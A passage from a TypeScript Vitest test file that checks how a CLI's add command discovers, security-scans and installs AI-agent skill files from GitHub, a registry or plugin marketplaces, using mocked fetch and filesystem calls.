    expect(Object.keys(lockArg.skills)).toHaveLength(3);
    expect(lockArg.skills).toHaveProperty("repo");
    expect(lockArg.skills).toHaveProperty("foo");
    expect(lockArg.skills).toHaveProperty("bar");
  });

  // TC-008: Single-skill repo behaves identically to before
  it("installs single skill when repo has only root SKILL.md", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(1);
    expect(lockArg.skills).toHaveProperty("repo");
  });

  // TC-009: --skill flag bypasses discovery
  it("bypasses discovery when --skill flag is provided", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Specific skill",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", { skill: "specific" });

    // Discovery should NOT have been called
    expect(mockDiscoverSkills).not.toHaveBeenCalled();
    // Should fetch from skills/specific/SKILL.md
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "https://raw.githubusercontent.com/owner/repo/main/skills/specific/SKILL.md"
    );
  });

  // TC-010: Failed scan for one skill does not block others
  it("skips failed skills and installs the rest", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "good1", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
      { name: "bad", path: "skills/bad/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/bad/SKILL.md" },
      { name: "good2", path: "skills/good2/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/good2/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    // Second scan fails
    mockRunTier1Scan
      .mockReturnValueOnce(makeScanResult())
      .mockReturnValueOnce(makeScanResult({ verdict: "FAIL", score: 10 }))
      .mockReturnValueOnce(makeScanResult());

    await addCommand("owner/repo", {});

    // All 3 scanned, but only 2 installed
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(3);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(2);
    expect(lockArg.skills).toHaveProperty("good1");
    expect(lockArg.skills).toHaveProperty("good2");
    expect(lockArg.skills).not.toHaveProperty("bad");
  });

  // TC-011: Discovery API failure falls back to single-skill install
  it("falls back to single root SKILL.md when discovery returns empty", async () => {
    mockDiscoverSkills.mockResolvedValue([]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Root skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    // Should fall back to fetching root SKILL.md directly
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "https://raw.githubusercontent.com/owner/repo/main/SKILL.md"
    );
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
  });
});

// ---------------------------------------------------------------------------
// Source format routing — 3-part, URL normalization, edge cases
// ---------------------------------------------------------------------------

describe("addCommand source format routing", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-017: 3-part format owner/repo/skill routes to installSingleSkillLegacy
  it("3-part format fetches from skills/<skill>/SKILL.md and bypasses discovery", async () => {
    await addCommand("owner/repo/my-skill", {});

    expect(mockDiscoverSkills).not.toHaveBeenCalled();
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "https://raw.githubusercontent.com/owner/repo/main/skills/my-skill/SKILL.md"
    );
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
  });

  // TC-018: 3-part format writes correct skill name to lockfile
  it("3-part format writes skill name (not repo) to lockfile", async () => {
    await addCommand("owner/repo/my-skill", {});

    expect(mockWriteLockfile).toHaveBeenCalled();
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(lockArg.skills).toHaveProperty("my-skill");
    expect(lockArg.skills["my-skill"].source).toBe("github:owner/repo");
  });

  // TC-019: 4+ parts falls through to registry lookup (not 3-part)
  it("4-part source falls through to registry lookup", async () => {
    mockGetSkill.mockResolvedValue({ content: "# Skill" });

    await addCommand("a/b/c/d", {});

    // Not treated as 3-part (parts.length === 4, not 3)
    expect(mockDiscoverSkills).not.toHaveBeenCalled();
    // Falls to registry because parts.length !== 2
    expect(mockGetSkill).toHaveBeenCalledWith("a/b/c/d");
  });

  // TC-020: Full GitHub URL normalized to 2-part before routing
  it("GitHub URL normalizes to owner/repo and triggers discovery", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
    ]);

    await addCommand("https://github.com/owner/repo", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("owner", "repo");
  });

  // TC-021: GitHub URL with .git suffix stripped
  it("GitHub URL with .git suffix strips it before routing", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
    ]);

    await addCommand("https://github.com/owner/repo.git", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("owner", "repo");
  });

  // TC-022: No source provided exits with error
  it("exits with error when source is undefined and no flags set", async () => {
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand(undefined, {}),
    ).rejects.toThrow("process.exit");

    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });

  // TC-023: 3-part format with --copy uses copy installer
  it("3-part format with --copy flag uses installCopy", async () => {
    await addCommand("owner/repo/my-skill", { copy: true });

    expect(mockInstallCopy).toHaveBeenCalled();
    expect(mockInstallSymlink).not.toHaveBeenCalled();
  });

  // TC-024: 3-part format with --global installs globally
  it("3-part format with --global flag passes global option", async () => {
    await addCommand("owner/repo/my-skill", { global: true });

    expect(mockInstallSymlink).toHaveBeenCalled();
    const installArgs = mockInstallSymlink.mock.calls[0];
    // installSymlink(skillName, content, agents, { global, projectRoot })
    expect(installArgs[3]).toEqual(expect.objectContaining({ global: true }));
  });

  // TC-025: 2-part + --skill is equivalent to 3-part format
  it("2-part with --skill fetches same URL as 3-part format", async () => {
    const expectedUrl = "https://raw.githubusercontent.com/owner/repo/main/skills/specific/SKILL.md";

    // 2-part with --skill flag
    await addCommand("owner/repo", { skill: "specific" });
    expect(globalThis.fetch).toHaveBeenCalledWith(expectedUrl);

    // Reset fetch mock
    (globalThis.fetch as ReturnType<typeof vi.fn>).mockClear();
    vi.clearAllMocks();
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    // 3-part format
    await addCommand("owner/repo/specific", {});
    expect(globalThis.fetch).toHaveBeenCalledWith(expectedUrl);
  });
});

// ---------------------------------------------------------------------------
// Registry install (installFromRegistry) — no slash in source
// ---------------------------------------------------------------------------

describe("addCommand registry install (no slash in source)", () => {
  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  it("installs a skill when registry returns content", async () => {
    mockGetSkill.mockResolvedValue({
      name: "my-skill",
      author: "alice",
      tier: "VERIFIED",
      score: 90,
      version: "1.0.0",
      sha: "",
      description: "A skill",
      content: "# My Skill\nDoes great things.",
      installs: 5,
      updatedAt: "2026-01-01T00:00:00Z",
    });

    await addCommand("my-skill", {});

    expect(mockGetSkill).toHaveBeenCalledWith("my-skill");
    expect(mockRunTier1Scan).toHaveBeenCalledWith("# My Skill\nDoes great things.");
    expect(mockWriteFileSync).toHaveBeenCalledWith(
      expect.stringContaining("my-skill"),
      "# My Skill\nDoes great things.",
      "utf-8"
    );
    expect(mockWriteLockfile).toHaveBeenCalledWith(
      expect.objectContaining({
        skills: expect.objectContaining({
          "my-skill": expect.objectContaining({ source: "registry:my-skill" }),
        }),
      }),
      expect.any(String),
    );
  });

  it("exits with error when skill is not in registry", async () => {
    mockGetSkill.mockRejectedValue(new Error("API request failed: 404 Not Found"));
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);

    await addCommand("nonexistent-skill", {});

    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });

  it("falls back to GitHub install via repoUrl when content is missing", async () => {
    mockGetSkill.mockResolvedValue({
      name: "remotion-dev-skills-remotion",
      author: "remotion-dev",
      tier: "VERIFIED",
      score: 100,
      version: "1.0.0",
      sha: "",
      description: "Remotion skill",
      content: undefined,
      installs: 0,
      updatedAt: "2026-02-20T00:00:00Z",
      repoUrl: "https://github.com/remotion-dev/skills",
    });

    // After fallback, addCommand calls discoverSkills("remotion-dev", "skills")
    mockDiscoverSkills.mockResolvedValue([
      { name: "remotion", path: "skills/remotion/SKILL.md", rawUrl: "https://raw.githubusercontent.com/remotion-dev/skills/main/skills/remotion/SKILL.md" },
    ]);
    // Then fetches the skill content from GitHub
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Remotion skill content",
    }) as unknown as typeof fetch;

    await addCommand("remotion-dev-skills-remotion", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("remotion-dev", "skills");
    // installOneGitHubSkill now uses canonical installer
    expect(mockInstallSymlink).toHaveBeenCalled();
  });

  it("falls back to GitHub install via author/skillName when repoUrl is absent", async () => {
    mockGetSkill.mockResolvedValue({
      name: "some-skill",
      author: "bob",
      tier: "SCANNED",
      score: 50,
      version: "0.1.0",
      sha: "",
      description: "",
      content: undefined,
      installs: 0,
      updatedAt: "2026-01-01T00:00:00Z",
    });

    // Fallback uses author/skillName → discoverSkills("bob", "some-skill")
    mockDiscoverSkills.mockResolvedValue([]);
    // Discovery empty → falls back to root SKILL.md fetch
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Some skill",
    }) as unknown as typeof fetch;

    await addCommand("some-skill", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("bob", "some-skill");
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("exits when no content, no repoUrl, and no author", async () => {
    mockGetSkill.mockResolvedValue({
      name: "",
      author: "",
      tier: "SCANNED",
      score: 0,
      version: "0.0.0",
      sha: "",
      description: "",
      content: undefined,
      installs: 0,
      updatedAt: "",
    });
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);

    await addCommand("mystery-skill", {});

    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// T-012 through T-015: Smart project root and agent filter integration
// ---------------------------------------------------------------------------

describe("addCommand smart project root resolution", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-012: Install from subdirectory resolves to project root
  it("installs skill relative to project root when cwd is a subdirectory", async () => {
    const projectRoot = "/home/user/project";
    mockFindProjectRoot.mockReturnValue(projectRoot);

    await addCommand("owner/safe-repo", {});

    // installSingleSkillLegacy now uses canonical installer
    expect(mockInstallSymlink).toHaveBeenCalled();
    const callArgs = mockInstallSymlink.mock.calls[0];
    // 4th arg is InstallOptions { global, projectRoot }
    expect(callArgs[3].projectRoot).toBe(projectRoot);
  });

  // TC-013: --cwd flag uses process.cwd() directly
  it("installs relative to process.cwd() when --cwd flag is used", async () => {
    const projectRoot = "/home/user/project";
    mockFindProjectRoot.mockReturnValue(projectRoot);

    await addCommand("owner/safe-repo", { cwd: true });

    // installSingleSkillLegacy now uses canonical installer
    expect(mockInstallSymlink).toHaveBeenCalled();
    // The canonical installer receives projectRoot from findProjectRoot
    // but --cwd doesn't affect the canonical installer directly
    // (the resolveInstallBase is no longer used for canonical flow)
  });
});

describe("addCommand --agent filter", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-014: --agent filters to specific agent
  it("installs only to the filtered agent when --agent is provided", async () => {
    const claude = makeAgent({ id: "claude-code", displayName: "Claude Code" });
    const cursor = makeAgent({
      id: "cursor",
      displayName: "Cursor",
      localSkillsDir: ".cursor/skills",
      globalSkillsDir: "~/.cursor/skills",
    });

    mockDetectInstalledAgents.mockResolvedValue([claude, cursor]);
    // filterAgents returns only claude when agent=["claude-code"]
    mockFilterAgents.mockReturnValue([claude]);

    await addCommand("owner/safe-repo", { agent: ["claude-code"] });

    // filterAgents should have been called with both agents and the filter
    expect(mockFilterAgents).toHaveBeenCalledWith(
      [claude, cursor],
      ["claude-code"],
    );

    // Canonical installer called with only the filtered agent
    expect(mockInstallSymlink).toHaveBeenCalled();
    const agents = mockInstallSymlink.mock.calls[0][2]; // 3rd arg = agents array
    expect(agents).toHaveLength(1);
    expect(agents[0].id).toBe("claude-code");
  });

  // TC-015: --agent with invalid ID shows error
  it("exits with error when --agent specifies unknown ID", async () => {
    const claude = makeAgent();
    mockDetectInstalledAgents.mockResolvedValue([claude]);
    mockFilterAgents.mockImplementation(() => {
      throw new Error("Unknown agent(s): nonexistent. Available: claude-code");
    });
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);
    const mockConsoleError = vi.spyOn(console, "error").mockImplementation(() => {});

    await addCommand("owner/safe-repo", { agent: ["nonexistent"] });

    expect(mockExit).toHaveBeenCalledWith(1);
    // Should NOT have written any files
    expect(mockWriteFileSync).not.toHaveBeenCalled();

    mockExit.mockRestore();
    mockConsoleError.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// TC-016: Nested directory bug — running install from inside agent base dir
// ---------------------------------------------------------------------------

describe("addCommand nested directory fix (TC-016)", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-016a: cwd is agent base dir → canonical installer receives correct projectRoot
  it("does not create nested agent dir when projectRoot ends with agent base folder", async () => {
    // Simulate running `vskill install` from inside ~/.openclaw/
    const agentBaseDir = "/home/user/.openclaw";
    mockFindProjectRoot.mockReturnValue(agentBaseDir);

    const openclaw = makeAgent({
      id: "openclaw",
      displayName: "OpenClaw",
      localSkillsDir: "skills",
      globalSkillsDir: "~/.openclaw/skills",
    });
    mockDetectInstalledAgents.mockResolvedValue([openclaw]);

    await addCommand("owner/safe-repo", {});

    // Canonical installer receives projectRoot = agentBaseDir
    // With localSkillsDir: "skills", the resolved path is /home/user/.openclaw/skills (no double nesting)
    expect(mockInstallSymlink).toHaveBeenCalled();
    const installOpts = mockInstallSymlink.mock.calls[0][3];
    expect(installOpts.projectRoot).toBe(agentBaseDir);
  });

  // TC-016b: --cwd flag uses process.cwd() directly as projectRoot
  it("does not create nested agent dir when --cwd and cwd is agent base dir", async () => {
    // Spy on process.cwd() to return the agent base dir
    const agentBaseDir = "/home/user/.openclaw";
    const cwdSpy = vi.spyOn(process, "cwd").mockReturnValue(agentBaseDir);

    const openclaw = makeAgent({
      id: "openclaw",
      displayName: "OpenClaw",
      localSkillsDir: "skills",
      globalSkillsDir: "~/.openclaw/skills",
    });
    mockDetectInstalledAgents.mockResolvedValue([openclaw]);

    await addCommand("owner/safe-repo", { cwd: true });

    // With --cwd, projectRoot should be process.cwd() directly (no findProjectRoot)
    expect(mockInstallSymlink).toHaveBeenCalled();
    const installOpts = mockInstallSymlink.mock.calls[0][3];
    expect(installOpts.projectRoot).toBe(agentBaseDir);

    cwdSpy.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// --repo flag tests
// ---------------------------------------------------------------------------

describe("addCommand with --repo flag (remote plugin install)", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  const marketplaceJson = JSON.stringify({
    name: "vskill",
    version: "1.0.0",
    plugins: [
      { name: "frontend", source: "./plugins/frontend", version: "1.0.0" },
      { name: "backend", source: "./plugins/backend", version: "1.0.0" },
    ],
  });

  function setupHappyPath() {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockFindProjectRoot.mockReturnValue("/project");
    mockExistsSync.mockReturnValue(false);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    // Mock fetch to respond differently based on URL
    globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
      // Marketplace manifest
      if (url.includes("marketplace.json")) {
        return { ok: true, text: async () => marketplaceJson, json: async () => JSON.parse(marketplaceJson) };
      }
      // GitHub Contents API: skills directory
      if (url.includes("/contents/plugins/frontend/skills")) {
        return {
          ok: true,
          json: async () => [
            { name: "nextjs", type: "dir" },
            { name: "react", type: "dir" },
          ],
        };
      }
      // GitHub Contents API: commands directory
      if (url.includes("/contents/plugins/frontend/commands")) {
        return {
          ok: true,
          json: async () => [
            { name: "scaffold.md", type: "file" },
          ],
        };
      }
      // Raw content: SKILL.md files
      if (url.includes("/skills/nextjs/SKILL.md")) {
        return { ok: true, text: async () => "# Next.js Skill\nFrontend framework" };
      }
      if (url.includes("/skills/react/SKILL.md")) {
        return { ok: true, text: async () => "# React Skill\nUI library" };
      }
      // Raw content: command files
      if (url.includes("/commands/scaffold.md")) {
        return { ok: true, text: async () => "# Scaffold\nGenerate project" };
      }
      return { ok: false };
    }) as unknown as typeof fetch;
  }

  it("installs skills and commands with plugin namespace prefix", async () => {
    setupHappyPath();

    await addCommand("ignored-source", { repo: "anton-abyzov/vskill", plugin: "frontend" });

    // Should have fetched marketplace + skills dir + commands dir + 3 content files = 6 calls
    expect(globalThis.fetch).toHaveBeenCalled();

    // Should write SKILL.md files under {plugin-name}/{skill-name}/SKILL.md
    const writeCalls = mockWriteFileSync.mock.calls as [string, string][];
    const skillPaths = writeCalls.filter(([p]) => p.includes("SKILL.md")).map(([p]) => p);
    expect(skillPaths.length).toBe(2);

    // Paths should contain frontend/nextjs/SKILL.md and frontend/react/SKILL.md
    expect(skillPaths.some(p => p.includes("/frontend/nextjs/SKILL.md"))).toBe(true);
    expect(skillPaths.some(p => p.includes("/frontend/react/SKILL.md"))).toBe(true);

    // Should also write the command file
    const cmdPaths = writeCalls.filter(([p]) => p.includes("scaffold.md")).map(([p]) => p);
    expect(cmdPaths.length).toBe(1);
    expect(cmdPaths[0]).toContain("/frontend/");
  });

  it("writes lockfile with github source format", async () => {
    setupHappyPath();

    await addCommand("ignored-source", { repo: "anton-abyzov/vskill", plugin: "frontend" });

    expect(mockWriteLockfile).toHaveBeenCalled();
    const lock = mockWriteLockfile.mock.calls[0][0];
    expect(lock.skills.frontend).toBeDefined();
    expect(lock.skills.frontend.source).toBe("github:anton-abyzov/vskill#plugin:frontend");
    expect(lock.skills.frontend.version).toBe("1.0.0");
  });

  it("exits with error for invalid --repo format", async () => {
    const exitSpy = vi.spyOn(process, "exit").mockImplementation(() => { throw new Error("exit"); });

    try {
      await addCommand("ignored", { repo: "noslash", plugin: "frontend" });
    } catch { /* expected */ }

    expect(exitSpy).toHaveBeenCalledWith(1);
    exitSpy.mockRestore();
  });

  it("exits with error when plugin not found in marketplace", async () => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
      if (url.includes("marketplace.json")) {
        return { ok: true, text: async () => marketplaceJson };
      }
      return { ok: false };
    }) as unknown as typeof fetch;

    const exitSpy = vi.spyOn(process, "exit").mockImplementation(() => { throw new Error("exit"); });

    try {
      await addCommand("ignored", { repo: "anton-abyzov/vskill", plugin: "nonexistent" });
    } catch { /* expected */ }

    expect(exitSpy).toHaveBeenCalledWith(1);
    exitSpy.mockRestore();
  });

  it("runs security scan on combined skill content", async () => {
    setupHappyPath();

    await addCommand("ignored", { repo: "anton-abyzov/vskill", plugin: "frontend" });

    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
    const scannedContent = mockRunTier1Scan.mock.calls[0][0] as string;
    // Combined content should include both skills and the command
    expect(scannedContent).toContain("Next.js Skill");
    expect(scannedContent).toContain("React Skill");
    expect(scannedContent).toContain("Scaffold");
  });
});

// ---------------------------------------------------------------------------
// Native Claude Code plugin install (via installPluginDir)
// ---------------------------------------------------------------------------
describe("addCommand native Claude Code plugin install", () => {
  const pluginDir = "/tmp/test-plugin";
  const marketplaceJson = JSON.stringify({
    name: "test-mkt",
    version: "1.0.0",
    plugins: [{ name: "sw-test", source: "./plugins/test", version: "1.0.0" }],
  });

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    // Plugin dir structure
    mockExistsSync.mockImplementation((p: string) => {
      if (p.includes("plugins/test")) return true;
      if (p.includes(".claude-plugin/marketplace.json")) return true;
      return false;
    });
    mockReadFileSync.mockReturnValue(marketplaceJson);
    mockReaddirSync.mockReturnValue([]);
    mockStatSync.mockReturnValue({ isDirectory: () => true, isFile: () => false });

    // Claude Code agent with claude CLI available
    const claudeAgent = makeAgent({ id: "claude-code", displayName: "Claude Code" });
    mockDetectInstalledAgents.mockResolvedValue([claudeAgent]);
  });

  it("skips native install when claude CLI is not available", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(false);

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true });

    expect(mockIsClaudeCliAvailable).toHaveBeenCalled();
    expect(mockRegisterMarketplace).not.toHaveBeenCalled();
    expect(mockInstallNativePlugin).not.toHaveBeenCalled();
  });

  it("skips native install when --copy flag is set", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(true);
    mockGetMarketplaceName.mockReturnValue("test-mkt");

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true, copy: true });

    expect(mockRegisterMarketplace).not.toHaveBeenCalled();
    expect(mockInstallNativePlugin).not.toHaveBeenCalled();
  });

  it("calls registerMarketplace and installNativePlugin when claude CLI available", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(true);
    mockGetMarketplaceName.mockReturnValue("test-mkt");
    mockRegisterMarketplace.mockReturnValue(true);
    mockInstallNativePlugin.mockReturnValue(true);

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true });

    expect(mockRegisterMarketplace).toHaveBeenCalled();
    expect(mockInstallNativePlugin).toHaveBeenCalledWith("sw-test", "test-mkt");
  });

  it("falls back to extraction when marketplace registration fails", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(true);
    mockGetMarketplaceName.mockReturnValue("test-mkt");
    mockRegisterMarketplace.mockReturnValue(false);

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true });

    expect(mockRegisterMarketplace).toHaveBeenCalled();
    expect(mockInstallNativePlugin).not.toHaveBeenCalled();
  });

  it("falls back to extraction when native install command fails", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(true);
    mockGetMarketplaceName.mockReturnValue("test-mkt");
    mockRegisterMarketplace.mockReturnValue(true);
    mockInstallNativePlugin.mockReturnValue(false);

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true });

    expect(mockRegisterMarketplace).toHaveBeenCalled();
    expect(mockInstallNativePlugin).toHaveBeenCalled();
    // Falls back to extraction — copyFileSync or mkdirSync should be called
  });

  it("skips native install when getMarketplaceName returns null", async () => {
    mockIsClaudeCliAvailable.mockReturnValue(true);
    mockGetMarketplaceName.mockReturnValue(null);

    await addCommand(pluginDir, { pluginDir, plugin: "sw-test", yes: true });

    expect(mockRegisterMarketplace).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// --all flag tests (bulk repo install)
// ---------------------------------------------------------------------------

describe("addCommand with --repo --all flag (bulk install)", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  const marketplaceJson = JSON.stringify({
    name: "vskill",
    version: "1.0.0",
    plugins: [
      { name: "frontend", source: "./plugins/frontend", description: "Frontend skills", version: "1.0.0" },
      { name: "backend", source: "./plugins/backend", description: "Backend skills", version: "1.0.0" },
      { name: "testing", source: "./plugins/testing", description: "Testing skills", version: "1.0.0" },
    ],
  });

  function setupAllHappyPath() {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockFindProjectRoot.mockReturnValue("/project");
    mockExistsSync.mockReturnValue(false);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
      if (url.includes("marketplace.json")) {
        return { ok: true, text: async () => marketplaceJson, json: async () => JSON.parse(marketplaceJson) };
      }
      // Skills directory for any plugin
      if (url.includes("/contents/plugins/") && url.includes("/skills")) {
        return {
          ok: true,
          json: async () => [{ name: "skill-one", type: "dir" }],
        };
      }
      // Commands directory
      if (url.includes("/contents/plugins/") && url.includes("/commands")) {
        return { ok: true, json: async () => [] };
      }
      // SKILL.md content
      if (url.includes("/SKILL.md")) {
        return { ok: true, text: async () => "# Test Skill\nDomain expertise" };
      }
      return { ok: false };
    }) as unknown as typeof fetch;
  }

  it("installs all plugins from marketplace when --all is passed", async () => {
    setupAllHappyPath();

    await addCommand(undefined, { repo: "anton-abyzov/vskill", all: true });

    // Should write lockfile entries for all 3 plugins
    expect(mockWriteLockfile).toHaveBeenCalledTimes(3);

    const lockCalls = mockWriteLockfile.mock.calls;
    const pluginNames = lockCalls.map((call) =>
      Object.keys((call[0] as { skills: Record<string, unknown> }).skills).filter(k => ["frontend", "backend", "testing"].includes(k))
    ).flat();
    expect(pluginNames).toContain("frontend");
    expect(pluginNames).toContain("backend");
    expect(pluginNames).toContain("testing");
  });

  it("writes lockfile with github source for each plugin", async () => {
    setupAllHappyPath();

    await addCommand(undefined, { repo: "anton-abyzov/vskill", all: true });

    // Check each call has correct source format
    const allLocks = mockWriteLockfile.mock.calls.map((call) => call[0] as { skills: Record<string, { source: string }> });
    const sources = allLocks.flatMap(lock =>
      Object.entries(lock.skills).map(([name, entry]) => ({ name, source: entry.source }))
    );

    const frontendEntry = sources.find(s => s.name === "frontend");
    expect(frontendEntry?.source).toBe("github:anton-abyzov/vskill#plugin:frontend");
  });

  it("continues installing after one plugin fails", async () => {
    setupAllHappyPath();

    // Make "backend" fail by having its skills dir return empty
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
      if (url.includes("marketplace.json")) {
